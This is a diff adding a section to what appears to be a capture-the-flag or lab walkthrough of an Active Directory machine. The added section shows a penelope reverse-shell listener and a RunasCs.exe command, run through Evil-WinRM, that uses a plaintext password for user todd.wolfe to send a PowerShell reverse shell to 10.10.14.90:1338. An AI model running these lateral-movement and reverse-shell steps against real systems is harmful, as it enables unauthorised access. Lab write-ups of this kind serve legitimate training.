@@ -356,3 +356,24 @@ PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031
 ```
 The user now should be restored
 
+# Shell as `todd.wolfe`
+```python
+penelope -p 1338     
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+```python
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> ./RunasCs.exe todd.wolfe 'NightT1meP1dg3on14' powershell -r 10.10.14.90:1338
+[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-3097ac$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6788 created in background.
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
+```
+I can now reuse runascs to get a session as todd.wofle since i already know his password
+
+```python
+
+```
